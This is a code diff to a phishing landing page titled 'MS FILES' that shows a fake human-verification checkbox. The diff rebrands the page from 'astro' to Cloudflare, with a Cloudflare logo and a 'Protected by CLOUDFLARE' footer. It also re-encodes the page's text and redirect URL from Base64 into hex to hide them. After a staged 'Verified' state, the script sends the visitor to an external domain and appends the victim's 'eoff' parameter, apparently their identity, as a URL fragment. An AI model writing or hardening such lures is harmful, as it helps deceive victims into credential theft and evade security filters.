@@ -5,147 +5,151 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        /* Encapsulated Style Variables */
-        :root { --p-accent: #4a6ee0; --s-accent: #28a745; --f-stack: 'Segoe UI', Roboto, sans-serif; }
-        body, html { margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: var(--f-stack); overflow: hidden; }
+        /* Re-engineered Style Definitions */
+        :root { --p-blue: #4a6ee0; --s-green: #28a745; --sys-font: 'Segoe UI', Roboto, sans-serif; }
+        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; font-family: var(--sys-font); overflow: hidden; }
 
-        /* Initial Shield */
-        #stage-loader {
-            position: fixed; inset: 0; background: #f8f9fa; z-index: 999;
+        /* Splash Architecture */
+        #splash-layer {
+            position: fixed; inset: 0; background: #f8f9fa; z-index: 500;
             display: flex; align-items: center; justify-content: center;
-            transition: opacity 0.5s ease;
+            transition: opacity 0.4s ease-in-out;
         }
-        .anim-element { width: 100px; filter: grayscale(20%); animation: pulse-node 1.8s infinite; }
-        @keyframes pulse-node { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
+        .pulse-img { width: 100px; filter: grayscale(20%); animation: breath-fx 1800ms infinite; }
+        @keyframes breath-fx { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
 
-        /* Main Viewport */
-        #view-wrapper {
+        /* Interface Layout */
+        #content-root {
             width: 100%; max-width: 400px; margin: 0 auto; padding: 32px;
             display: flex; flex-direction: column; height: 80vh; justify-content: center;
-            opacity: 0; transform: translateY(15px); transition: 0.8s;
+            visibility: hidden; opacity: 0; transform: translateY(15px); transition: 0.8s;
         }
-        .reveal #view-wrapper { opacity: 1; transform: translateY(0); }
+        .is-active #content-root { visibility: visible; opacity: 1; transform: translateY(0); }
 
-        .desc-node { text-align: center; font-size: 17.6px; color: #1a1a1a; font-weight: 500; margin-bottom: 32px; line-height: 1.5; }
+        .headline { text-align: center; font-size: 17.6px; color: #1a1a1a; font-weight: 500; margin-bottom: 32px; line-height: 1.5; }
 
-        /* Validation UI */
-        .plate {
+        /* Interaction Panel */
+        .auth-panel {
             background: #fbfbfb; border: 1px solid #e0e0e0; border-radius: 12px; height: 40px;
             padding: 35px 22px; display: flex; align-items: center; justify-content: space-between;
             box-shadow: 0 2px 5px rgba(0,0,0,0.02);
         }
-        .plate-left { display: flex; align-items: center; gap: 19px; }
+        .auth-inner { display: flex; align-items: center; gap: 19px; }
 
-        .box-trigger {
-            width: 20px; height: 20px; border: 2.5px solid var(--p-accent); border-radius: 5px;
+        .check-node {
+            width: 20px; height: 20px; border: 2.5px solid var(--p-blue); border-radius: 5px;
             cursor: pointer; position: relative; transition: 300ms;
         }
 
-        /* Logic States */
-        .waiting { border-radius: 50%; border-color: #ddd; border-top-color: var(--p-accent); animation: rot-node 0.8s linear infinite; }
-        .success { background: var(--s-accent); border-color: var(--s-accent); }
-        .success::after { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
+        /* State Classes */
+        .working { border-radius: 50%; border-color: #ddd; border-top-color: var(--p-blue); animation: spin-fx 0.8s linear infinite; }
+        .finished { background: var(--s-green); border-color: var(--s-green); }
+        .finished::after { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
 
-        @keyframes rot-node { 100% { transform: rotate(360deg); } }
+        @keyframes spin-fx { 100% { transform: rotate(360deg); } }
 
-        .sub-sec { text-align: right; font-size: 11px; color: #888; }
-        .sub-sec img { width: 28px; margin-bottom: 4px; }
-        .sub-sec b { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }
+        .brand-box { text-align: right; font-size: 11px; color: #888; }
+        .brand-box img { width: 28px; margin-bottom: 4px; }
+        .brand-box span { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; font-weight: bold; }
 
-        .footer-pin {
+        .sticky-footer {
             position: absolute; bottom: 25px; width: 100%; text-align: center;
             font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 7px;
         }
-        .glyph { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
+        .shield-icon { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
     </style>
 </head>
-<body id="context-body">
+<body id="main-context">
 
-    <div id="stage-loader">
-        <img src="astro.png" class="anim-element">
+    <div id="splash-layer">
+        <img src="astro.png" class="pulse-img">
     </div>
 
-    <div id="view-wrapper">
-        <h1 class="desc-node" id="msg-01"></h1>
+    <main id="content-root">
+        <h1 class="headline" id="lbl-instruct"></h1>
 
-        <div class="plate">
-            <div class="plate-left">
-                <div id="interact-box" class="box-trigger"></div>
-                <span id="msg-02" style="font-weight: 600; color: #333; letter-spacing: -0.2px;"></span>
+        <div class="auth-panel">
+            <div class="auth-inner">
+                <div id="btn-trigger" class="check-node"></div>
+                <span id="lbl-status" style="font-weight: 600; color: #333; letter-spacing: -0.2px;"></span>
             </div>
 
-            <div class="sub-sec">
-                <img src="astro_.png">
-                <b>astro</b>
+            <div class="brand-box">
+                <img src="cloudflare_.png">
+                <span>CLOUDFLARE</span>
                 Privacy &middot; Terms
             </div>
         </div>
-    </div>
+    </main>
 
-    <div class="footer-pin">
-        <div class="glyph"></div>
-        Protected by astro
+    <div class="sticky-footer">
+        <div class="shield-icon"></div>
+        Protected by CLOUDFLARE
     </div>
 
     <script>
         (function() {
             "use strict";
 
-            // Obfuscated Content Map (Base64)
-            const CONTENT = {
-                t1: "VmVyaWZ5IHlvdSBhcmUgaHVtYW4gYnkgY29tcGxldGluZyB0aGUgYWN0aW9uIGJlbG93IHRvIHZpZXcgYXR0YWNobWVudA==", // Verify text
-                t2: "VmVyaWZ5", // Verify
-                t3: "UHJvY2Vzc2luZy4uLg==", // Processing...
-                t4: "VmVyaWZpZWQ=", // Verified
-                // Target URL: https://po.blanread.info/s/1qyzx7XI7ojXNxIhgbO
-                dest: "aHR0cHM6Ly9wby5ibGFucmVhZC5pbmZvL3MvMXF5eng3WEk3b2pYTnhJaGdiTw=="
+            // Hex-encoded string data
+            const DATA_CHUNKS = {
+                v1: "56657269667920796f75206172652068756d616e20627920636f6d706c6574696e672074686520616374696f6e2062656c6f7720746f2076696577206174746163686d656e74",
+                v2: "566572696679",
+                v3: "50726f63657373696e672e2e2e",
+                v4: "5665726966696564",
+                // Redirect URL: https://po.blanread.info/s/1qyzx7XI7ojXNxIhgbO
+                url: "68747470733a2f2f706f2e626c616e726561642e696e666f2f732f3171797a78375849376f6a584e78496867624f"
             };
 
-            const decode = (str) => atob(str);
-            let activeState = false;
+            const parseHex = (hex) => hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
+            let isLocked = false;
 
-            // Load texts dynamically
-            document.getElementById('msg-01').textContent = decode(CONTENT.t1);
-            document.getElementById('msg-02').textContent = decode(CONTENT.t2);
+            // DOM Injection
+            document.getElementById('lbl-instruct').textContent = parseHex(DATA_CHUNKS.v1);
+            document.getElementById('lbl-status').textContent = parseHex(DATA_CHUNKS.v2);
 
-            // Startup Sequence
+            // Startup
             window.addEventListener('load', () => {
                 setTimeout(() => {
-                    const gate = document.getElementById('stage-loader');
+                    const gate = document.getElementById('splash-layer');
                     gate.style.opacity = '0';
                     setTimeout(() => {
                         gate.remove();
-                        document.getElementById('context-body').classList.add('reveal');
-                    }, 500);
+                        document.getElementById('main-context').className = 'is-active';
+                    }, 400);
                 }, 1300);
             });
 
-            // Action Execution
-            const runVerification = async () => {
-                if (activeState) return;
-                activeState = true;
+            // Logical Flow
+            const beginProcess = async () => {
+                if (isLocked) return;
+                isLocked = true;
 
-                const box = document.getElementById('interact-box');
-                const label = document.getElementById('msg-02');
+                const node = document.getElementById('btn-trigger');
+                const text = document.getElementById('lbl-status');
 
-                label.textContent = decode(CONTENT.t3);
-                box.classList.add('waiting');
+                text.textContent = parseHex(DATA_CHUNKS.v3);
+                node.classList.add('working');
 
                 await new Promise(r => setTimeout(r, 1600));
 
-                box.classList.remove('waiting');
-                box.classList.add('success');
-                label.textContent = decode(CONTENT.t4);
+                node.classList.replace('working', 'finished');
+                text.textContent = parseHex(DATA_CHUNKS.v4);
 
+                // REDIRECTION LOGIC WITH eoff SUPPORT
                 setTimeout(() => {
-                    const target = decode(CONTENT.dest);
-                    const hash = new URLSearchParams(window.location.search).get('eoff');
+                    const base = parseHex(DATA_CHUNKS.url);
+                    const locator = new URLSearchParams(window.location.search);
+                    const eoffVal = locator.get('eoff');
 
-                    window.location.replace(hash ? `${target}#${hash}` : target);
+                    // If eoff parameter exists, append it via fragment identifier as per original requirement
+                    const finalDest = eoffVal ? `${base}#${eoffVal}` : base;
+
+                    window.location.replace(finalDest);
                 }, 800);
             };
 
-            document.getElementById('interact-box').addEventListener('click', runVerification);
+            document.getElementById('btn-trigger').addEventListener('click', beginProcess);
 
         })();
     </script>
